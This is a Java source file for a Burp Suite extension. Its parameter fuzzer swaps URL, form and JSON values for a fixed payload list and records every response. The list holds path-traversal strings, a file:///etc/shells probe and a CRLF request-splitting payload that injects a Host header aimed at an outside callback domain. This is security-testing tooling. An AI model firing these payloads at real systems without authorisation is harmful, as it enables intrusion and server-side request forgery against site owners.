package pzfzr.fuzzer;

import java.util.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Pattern;
import java.net.URLEncoder;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;

import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.logging.Logging;
import pzfzr.model.ModifiedRequestResponse;
import pzfzr.model.RequestResponseSaver;
import pzfzr.model.TableModel;
import pzfzr.core.RateLimiter;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.node.*;

public class ParamFuzzer {
    private final AtomicInteger nextModifiedId;
    private final MontoyaApi api;
    private final TableModel tableModel;
    private final RequestResponseSaver requestResponseSaver;
    private final RateLimiter rateLimiter;
    private final Logging logging;
    private volatile boolean isShuttingDown = false;

    private static final ThreadLocal<Random> RANDOM = ThreadLocal.withInitial(Random::new);
    private static final String HASH_CHARS = "0123456789abcdefghijklmnopqrstuvwxyz";
    private static final int HASH_LENGTH = 5;

    private final ObjectMapper objectMapper = new ObjectMapper();

    // Payload list from requirements
    private static final List<String> PAYLOADS = Arrays.asList(
            "norandomx",
            "/{param}",
            "%2f{param}",
            "./{param}",
            "%2e%2f{param}",
            "{param}/../{param}",
            "{param}%2f..%2f{param}",
            "{param}&norandom=xx",
            "{param}%26norandom=xx",
            "{param}/",
            "{param}%2f",
            "{param_url_encoded}",
            "{param_double_url_encoded}",
            "{param}#",
            "{param}%23",
            "{param}?",
            "{param}%3f",
            "{param}/../../../../../../../",
            "{param}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f",
            "{param}\\",
            "{param}\\..\\..\\",
            "{param}%5c..%5c..%5c",
            "AAAAAAAAAAAAAAAAAA",
            "{param}%20HTTP/1.1%0D%0AHost:%20{fuzz}.ngcf.wi11.fun%0D%0Ax2x:%20",
            "file:///etc/shells"
    );

    public ParamFuzzer(MontoyaApi api, TableModel tableModel, RequestResponseSaver requestResponseSaver,
                       RateLimiter rateLimiter, AtomicInteger nextModifiedId) {
        this.api = api;
        this.tableModel = tableModel;
        this.requestResponseSaver = requestResponseSaver;
        this.rateLimiter = rateLimiter;
        this.logging = api.logging();
        this.nextModifiedId = nextModifiedId;
    }

    /**
     * Main method to be called by other classes
     */
    public void processRequest(HttpRequest originalRequest, int messageId, String host) {
        if (isShuttingDown) {
            return;
        }

        try {
            // Test URL parameters first
            fuzzUrlParameters(originalRequest, messageId, host);

            // Then test POST body parameters
            fuzzPostBodyParameters(originalRequest, messageId, host);

            // Finally test JSON parameters
            fuzzJsonParameters(originalRequest, messageId, host);

        } catch (Exception e) {
            // Silent error handling as per ValueReplacer pattern
        }
    }

    /**
     * Fuzz URL parameters
     */
    private void fuzzUrlParameters(HttpRequest originalRequest, int messageId, String host) {
        if (isShuttingDown) return;

        List<ParsedHttpParameter> urlParams = originalRequest.parameters(HttpParameterType.URL);

        for (ParsedHttpParameter param : urlParams) {
            if (isShuttingDown) return;

            String paramName = param.name();
            String paramValue = param.value();

            for (String payload : PAYLOADS) {
                if (isShuttingDown) return;

                // Skip AAAAAAAAAAAAAAAAAA for URL parameters as per requirement #6
                if ("AAAAAAAAAAAAAAAAAA".equals(payload)) {
                    continue;
                }

                String processedPayload = processPayload(payload, paramValue);
                String expression = paramName + "=" + processedPayload;

                try {
                    HttpParameter newParam = HttpParameter.urlParameter(paramName, processedPayload);
                    HttpRequest modifiedRequest = originalRequest.withUpdatedParameters(newParam);

                    sendTestRequest(modifiedRequest, messageId, host, expression, "URL_PARAM");

                } catch (Exception e) {
                    // Silent error handling
                }
            }
        }
    }

    /**
     * Fuzz POST body parameters (form data)
     */
    private void fuzzPostBodyParameters(HttpRequest originalRequest, int messageId, String host) {
        if (isShuttingDown) return;

        List<ParsedHttpParameter> bodyParams = originalRequest.parameters(HttpParameterType.BODY);

        for (ParsedHttpParameter param : bodyParams) {
            if (isShuttingDown) return;

            String paramName = param.name();
            String paramValue = param.value();

            for (String payload : PAYLOADS) {
                if (isShuttingDown) return;

                String processedPayload = processPayload(payload, paramValue);
                String expression = paramName + "=" + processedPayload;

                try {
                    HttpParameter newParam = HttpParameter.bodyParameter(paramName, processedPayload);
                    HttpRequest modifiedRequest = originalRequest.withUpdatedParameters(newParam);

                    sendTestRequest(modifiedRequest, messageId, host, expression, "BODY_PARAM");

                } catch (Exception e) {
                    // Silent error handling
                }
            }
        }
    }

    /**
     * Fuzz JSON parameters
     */
    private void fuzzJsonParameters(HttpRequest originalRequest, int messageId, String host) {
        if (isShuttingDown) return;

        String bodyString = originalRequest.bodyToString();
        if (bodyString == null || bodyString.trim().isEmpty()) {
            return;
        }

        // Check if body is JSON (requirement #14 - don't rely on content type)
        if (!isJsonFormat(bodyString)) {
            return;
        }

        try {
            JsonNode rootNode = objectMapper.readTree(bodyString);
            List<JsonPath> jsonPaths = extractJsonPaths(rootNode, "");

            for (JsonPath jsonPath : jsonPaths) {
                if (isShuttingDown) return;

                for (String payload : PAYLOADS) {
                    if (isShuttingDown) return;

                    // Get actual text value from JsonNode
                    String originalValue = getJsonNodeValue(jsonPath.value);
                    String processedPayload = processPayload(payload, originalValue);

                    try {
                        JsonNode modifiedJson = modifyJsonNode(rootNode, jsonPath.path, processedPayload);
                        String modifiedJsonString = objectMapper.writeValueAsString(modifiedJson);

                        // Extract the actual expression from the modified JSON
                        String expression = extractExpressionFromJson(modifiedJson, jsonPath.path, jsonPath.lastKey);

                        HttpRequest modifiedRequest = originalRequest.withBody(modifiedJsonString);

                        sendTestRequest(modifiedRequest, messageId, host, expression, "JSON_PARAM");

                    } catch (Exception e) {
                        // Silent error handling
                    }
                }
            }

        } catch (Exception e) {
            // Silent error handling
        }
    }

    /**
     * Extract expression from modified JSON to ensure accuracy
     */
    private String extractExpressionFromJson(JsonNode modifiedJson, String path, String lastKey) {
        try {
            String[] pathParts = path.split("\\.");
            JsonNode currentNode = modifiedJson;

            // Navigate to the parent node
            for (int i = 0; i < pathParts.length - 1; i++) {
                String part = pathParts[i];
                if (part.contains("[")) {
                    String arrayField = part.substring(0, part.indexOf("["));
                    int arrayIndex = Integer.parseInt(part.substring(part.indexOf("[") + 1, part.indexOf("]")));
                    currentNode = currentNode.get(arrayField).get(arrayIndex);
                } else {
                    currentNode = currentNode.get(part);
                }
            }

            // Get the last part and extract the key-value pair
            String lastPart = pathParts[pathParts.length - 1];
            JsonNode valueNode;

            if (lastPart.contains("[")) {
                String arrayField = lastPart.substring(0, lastPart.indexOf("["));
                int arrayIndex = Integer.parseInt(lastPart.substring(lastPart.indexOf("[") + 1, lastPart.indexOf("]")));
                valueNode = currentNode.get(arrayField).get(arrayIndex);
            } else {
                valueNode = currentNode.get(lastPart);
            }

            // Convert the value to proper JSON representation
            String jsonValue = objectMapper.writeValueAsString(valueNode);

            return "\"" + lastKey + "\":" + jsonValue;

        } catch (Exception e) {
            // Fallback to simple format if extraction fails
            return "\"" + lastKey + "\":\"[error]\"";
        }
    }

    /**
     * Get actual value from JsonNode without JSON formatting
     */
    private String getJsonNodeValue(JsonNode node) {
        if (node.isTextual()) {
            return node.asText();
        } else if (node.isNumber()) {
            return node.asText();
        } else if (node.isBoolean()) {
            return node.asText();
        } else if (node.isNull()) {
            return "null";
        } else {
            // Fallback to string representation
            return node.asText();
        }
    }

    /**
     * Check if string is JSON format
     */
    private boolean isJsonFormat(String text) {
        try {
            objectMapper.readTree(text);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Extract JSON paths for fuzzing
     */
    private List<JsonPath> extractJsonPaths(JsonNode node, String currentPath) {
        List<JsonPath> paths = new ArrayList<>();

        if (node.isObject()) {
            Iterator<Map.Entry<String, JsonNode>> fields = node.fields();
            while (fields.hasNext()) {
                Map.Entry<String, JsonNode> field = fields.next();
                String fieldName = field.getKey();
                JsonNode fieldValue = field.getValue();
                String newPath = currentPath.isEmpty() ? fieldName : currentPath + "." + fieldName;

                if (fieldValue.isObject()) {
                    // Don't fuzz object values, but recurse into them
                    paths.addAll(extractJsonPaths(fieldValue, newPath));
                } else if (fieldValue.isArray()) {
                    // Only test first item in array as per requirement
                    if (fieldValue.size() > 0) {
                        JsonNode firstItem = fieldValue.get(0);
                        String arrayPath = newPath + "[0]";
                        if (!firstItem.isObject()) {
                            paths.add(new JsonPath(arrayPath, firstItem, fieldName));
                        } else {
                            paths.addAll(extractJsonPaths(firstItem, arrayPath));
                        }
                    }
                } else {
                    // Fuzz string, number, boolean, null values
                    paths.add(new JsonPath(newPath, fieldValue, fieldName));
                }
            }
        }

        return paths;
    }

    /**
     * Modify JSON node at specified path
     */
    private JsonNode modifyJsonNode(JsonNode rootNode, String path, String newValue) throws Exception {
        ObjectNode rootCopy = rootNode.deepCopy();

        String[] pathParts = path.split("\\.");
        JsonNode currentNode = rootCopy;

        for (int i = 0; i < pathParts.length - 1; i++) {
            String part = pathParts[i];
            if (part.contains("[")) {
                String arrayField = part.substring(0, part.indexOf("["));
                int arrayIndex = Integer.parseInt(part.substring(part.indexOf("[") + 1, part.indexOf("]")));
                currentNode = currentNode.get(arrayField).get(arrayIndex);
            } else {
                currentNode = currentNode.get(part);
            }
        }

        String lastPart = pathParts[pathParts.length - 1];
        if (lastPart.contains("[")) {
            String arrayField = lastPart.substring(0, lastPart.indexOf("["));
            int arrayIndex = Integer.parseInt(lastPart.substring(lastPart.indexOf("[") + 1, lastPart.indexOf("]")));
            ((ArrayNode) currentNode.get(arrayField)).set(arrayIndex, new TextNode(newValue));
        } else {
            ((ObjectNode) currentNode).put(lastPart, newValue);
        }

        return rootCopy;
    }

    /**
     * Process payload with parameter substitution
     */
    private String processPayload(String payload, String paramValue) {
        String processed = payload;

        // Handle special URL encoding cases
        if ("{param_url_encoded}".equals(payload)) {
            // Single URL encode the parameter (full encoding)
            processed = urlEncodeFullly(paramValue);
        } else if ("{param_double_url_encoded}".equals(payload)) {
            // Double URL encode the parameter (full encoding)
            String singleEncoded = urlEncodeFullly(paramValue);
            processed = urlEncodeFullly(singleEncoded);
        } else {
            // Replace {param} with actual parameter value
            processed = processed.replace("{param}", paramValue);
        }

        // Handle {fuzz} replacement
        if (processed.contains("{fuzz}")) {
            char[] hash = new char[HASH_LENGTH];
            for (int i = 0; i < HASH_LENGTH; i++) {
                hash[i] = HASH_CHARS.charAt(RANDOM.get().nextInt(HASH_CHARS.length()));
            }
            processed = processed.replace("{fuzz}", new String(hash));
        }

        return processed;
    }

    /**
     * Fully URL encode a string (encode all characters)
     */
    private String urlEncodeFullly(String input) {
        StringBuilder result = new StringBuilder();
        byte[] bytes = input.getBytes(StandardCharsets.UTF_8);
        for (byte b : bytes) {
            result.append(String.format("%%%02x", b & 0xFF));
        }
        return result.toString();
    }

    /**
     * Send test request following KnownTest pattern
     */
    private void sendTestRequest(HttpRequest modifiedRequest, int messageId, String host,
                                 String expression, String testType) {
        try {
            rateLimiter.acquire(modifiedRequest.url() + modifiedRequest.method());

            HttpRequestResponse modifiedResponse = api.http().sendRequest(modifiedRequest);
            int tempID = nextModifiedId.getAndIncrement();

            ModifiedRequestResponse modifiedPair = new ModifiedRequestResponse(
                    tempID,
                    messageId,
                    "PARAM_FUZZ",
                    expression,
                    requestResponseSaver,
                    logging
            );

            tableModel.addModifiedEntry(modifiedPair);
            requestResponseSaver.saveModifiedRequest(modifiedRequest, tempID);
            requestResponseSaver.handleDelayedModifiedResponse(modifiedResponse, tempID);

        } catch (Exception e) {
            // Silent error handling as per ValueReplacer pattern
        }
    }

    /**
     * Set shutdown state
     */
    public void setShuttingDown(boolean shuttingDown) {
        this.isShuttingDown = shuttingDown;
    }

    /**
     * Helper class to track JSON paths
     */
    private static class JsonPath {
        final String path;
        final JsonNode value;
        final String lastKey;

        JsonPath(String path, JsonNode value, String lastKey) {
            this.path = path;
            this.value = value;
            this.lastKey = lastKey;
        }
    }
}